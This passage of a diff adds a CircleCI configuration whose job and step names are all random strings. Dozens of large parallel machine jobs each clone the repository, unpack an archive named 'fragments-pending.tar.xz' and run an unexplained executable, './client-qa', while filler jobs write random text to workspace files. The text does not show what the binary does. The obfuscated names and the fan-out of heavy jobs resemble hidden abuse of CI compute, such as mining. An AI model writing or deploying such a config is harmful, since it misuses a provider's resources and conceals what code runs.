+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  liaxhepyttfum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: pftliaploax
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'urxqwnevkhkt wcfjfjepxnfz' > /tmp/dkpsqtoqeciutgo/eoseqfvvpc
+            ls -la /tmp/dkpsqtoqeciutgo/eoseqfvvpc
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'eoseqfvvpc'
+  nqwndvfpbw:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: obholvja
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: nvqvylgdhrsu
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: cvtnbbgmyfarr
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  hbwxjhnadopyuhk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: uitwibnbtjhvxl
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'vdehmbygpcpnz xkvmcvwofchee' > /tmp/dkpsqtoqeciutgo/mttadvsqp
+            ls -la /tmp/dkpsqtoqeciutgo/mttadvsqp
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'mttadvsqp'
+  tbricfnpcdz:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: knrugaxj
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mttadvsqp 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: djcocpoxyp
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: xyuwcilavaes
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  kvhgvwx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: rlukj
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'drotczwiyjmki mwkkorbvyhjgh' > /tmp/dkpsqtoqeciutgo/dfztdvjvi
+            ls -la /tmp/dkpsqtoqeciutgo/dfztdvjvi
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'dfztdvjvi'
+  fcfqvmghlwpxsp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: cpojxvwjetyl
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: swsxkkxfkdafqjg
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: jcbrcrdj
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  byykskvken:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: hpbdtbldwhr
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'xyzikbzfar lohogneyqptvwr' > /tmp/dkpsqtoqeciutgo/albzevvgjuetlt
+            ls -la /tmp/dkpsqtoqeciutgo/albzevvgjuetlt
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'albzevvgjuetlt'
+  twyqiocrpzdl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: dleyhessmy
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/mttadvsqp 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: ydlmdj
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: bwwuzmlq
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  jtlkwprp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: rhjvrumqg
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'pahpqttndgikk gobxbcqkyszbbphi' > /tmp/dkpsqtoqeciutgo/mwzmccyca
+            ls -la /tmp/dkpsqtoqeciutgo/mwzmccyca
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'mwzmccyca'
+  cjzhktjzkqp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: oytsnjruxtvsvy
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: tzlci
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: ypnzkwcnn
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  rznpbwkdt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: lptuh
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'xaewhfvdrkysdugt loxohflkgtmyglmwp' > /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe
+            ls -la /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'tffeykgwynuiwe'
+  gsbavziricjnnzv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: obrzrevst
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: dtaokfdsarwkk
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: qssmdanmznigbz
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+  obtueogly:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: awsxm
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'yibbczljxyfkkljqcv qirnjzmfivkhtc' > /tmp/dkpsqtoqeciutgo/ldqppymjcp
+            ls -la /tmp/dkpsqtoqeciutgo/ldqppymjcp
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'ldqppymjcp'
+  nlfukguf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: hreajbaqwwz
+          command: |
+            { cnt=0; while read -r _; do ((cnt++)); [ $cnt -ge 5 ] && break; done < /tmp/dkpsqtoqeciutgo/tffeykgwynuiwe 2>/dev/null; echo "cnt=$cnt"; } || true
+      - run:
+          name: nvcyad
+          command: git clone --depth 2 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: dhqoxvszwuhokx
+          command: xzcat fragments-pending.tar.xz | tar xvf -
+      - run:
+          command: /bin/bash -c "./client-qa"
+
+  jnkdbtxf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: ioavxmze
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'gtijqaiyassidgg bhjglhlojjbqewtm' > /tmp/dkpsqtoqeciutgo/rsnond
+            ls -la /tmp/dkpsqtoqeciutgo/rsnond
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'rsnond'
+  nkmfqz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: gqpfbmwyamuh
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'nvbhxpvpfve jtrmzvkjcpr' > /tmp/dkpsqtoqeciutgo/qzdzieoez
+            ls -la /tmp/dkpsqtoqeciutgo/qzdzieoez
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'qzdzieoez'
+  qhhjrmydgdsfh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: kgoipfvdetseggs
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'ymfxqasryltyftynrb dgnpdfnyarbknibq' > /tmp/dkpsqtoqeciutgo/mzmpiohudxloae
+            ls -la /tmp/dkpsqtoqeciutgo/mzmpiohudxloae
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'mzmpiohudxloae'
+  lipovtfjs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dppclscqizkzzx
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'tazngedjsdlueezqho pvqpwydlnjrls' > /tmp/dkpsqtoqeciutgo/kztuadmdcsagvt
+            ls -la /tmp/dkpsqtoqeciutgo/kztuadmdcsagvt
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'kztuadmdcsagvt'
+  xgsysssxn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: sbdkvjfcjvv
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'pivuffoaparrsv grckkeeuejfizi' > /tmp/dkpsqtoqeciutgo/hctavrumxhu
+            ls -la /tmp/dkpsqtoqeciutgo/hctavrumxhu
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'hctavrumxhu'
+  paqnd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: jpcexnmjny
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'hadeyfeovhsjxkzx kcuhaxaucsgujri' > /tmp/dkpsqtoqeciutgo/mwnlilwabib
+            ls -la /tmp/dkpsqtoqeciutgo/mwnlilwabib
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'mwnlilwabib'
+  nfnxlbdrbuythp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: xibist
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'zqiwvihytwy qgbcaoheml' > /tmp/dkpsqtoqeciutgo/hqithyzejhsaj
+            ls -la /tmp/dkpsqtoqeciutgo/hqithyzejhsaj
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'hqithyzejhsaj'
+  ctmuhwljtsgi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/dkpsqtoqeciutgo
+      - run:
+          name: lgeszvyoslxbrvx
+          command: |
+            mkdir -p /tmp/dkpsqtoqeciutgo
+            echo 'vbduxzdjnndviihxcb vxzjsccemc' > /tmp/dkpsqtoqeciutgo/jniltrtpzoecfi
+            ls -la /tmp/dkpsqtoqeciutgo/jniltrtpzoecfi
+      - persist_to_workspace:
+          root: /tmp/dkpsqtoqeciutgo
+          paths:
+            - 'jniltrtpzoecfi'
+workflows:
+  doexjmulzzuj:
+    jobs:
+      - hbwxjhnadopyuhk
+      - otwxnjtx
+      - tbricfnpcdz:
+          requires:
+            - hbwxjhnadopyuhk
+            - otwxnjtx
+      - lpfojx:
+          requires:
+            - hbwxjhnadopyuhk
+            - otwxnjtx
+      - dwjks:
+          requires:
+            - hbwxjhnadopyuhk
+            - otwxnjtx
+      - muqnxlb:
+          requires:
+            - hbwxjhnadopyuhk
+            - otwxnjtx
+      - twyqiocrpzdl:
+          requires:
+            - hbwxjhnadopyuhk
+            - otwxnjtx
+      - uutmkzcsz:
+          requires:
+            - hbwxjhnadopyuhk
+            - otwxnjtx
+      - fnmzzxupxbz:
+          requires:
+            - hbwxjhnadopyuhk
+            - otwxnjtx
+      - jsgavcnydyi:
+          requires:
+            - hbwxjhnadopyuhk
+            - otwxnjtx
+      - wqiwoakzubi:
+          requires:
+            - hbwxjhnadopyuhk
+            - otwxnjtx
+      - fflcqmydlto
+      - jnkdbtxf:
+          requires:
+            - fflcqmydlto
+      - onjqpsfzjfdc:
+          requires:
+            - jnkdbtxf
+      - ckaleiobnfcf:
+          requires:
+            - jnkdbtxf
+      - nkmfqz:
+          requires:
+            - ckaleiobnfcf
+      - oghrvxyqfmxhreo:
+          requires:
+            - nkmfqz
+      - yhtmvlw:
+          requires:
+            - nkmfqz
+      - qhhjrmydgdsfh:
+          requires:
+            - yhtmvlw
+      - ebnpude:
+          requires:
+            - qhhjrmydgdsfh
+      - xiirgehfal:
+          requires:
+            - qhhjrmydgdsfh
+      - lipovtfjs:
+          requires:
+            - xiirgehfal
+      - nrxtvuxgtpn:
+          requires:
+            - lipovtfjs
+      - hthxuwvhq:
+          requires:
+            - lipovtfjs
+      - xgsysssxn:
+          requires:
+            - hthxuwvhq
+      - bduawzurvhllscm:
+          requires:
+            - xgsysssxn
+      - ccxeudaqcmqyzye:
+          requires:
+            - xgsysssxn
+      - paqnd:
+          requires:
+            - ccxeudaqcmqyzye
+      - vhtzqllri:
+          requires:
+            - paqnd
+      - qekgtnkatwv:
+          requires:
+            - paqnd
+      - nfnxlbdrbuythp:
+          requires:
+            - qekgtnkatwv
+      - jldyce:
+          requires:
+            - nfnxlbdrbuythp
+      - swiqbjetkosyfdd:
+          requires:
+            - nfnxlbdrbuythp
+      - ctmuhwljtsgi:
+          requires:
+            - swiqbjetkosyfdd
+      - ozceuidpahogv:
+          requires:
+            - ctmuhwljtsgi
+      - rznpbwkdt
+      - dpvhaepv
+      - gsbavziricjnnzv:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - zivhpe:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - nodusqua:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - arqfeixlebxdv:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - cjzhktjzkqp:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - hcyemx:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - nqwndvfpbw:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - bkziksxiynyl:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - nlfukguf:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - fcfqvmghlwpxsp:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - uyngxmjleztmueg:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - ajsvywvtug:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
+      - xtulsxswo:
+          requires:
+            - rznpbwkdt
+            - dpvhaepv
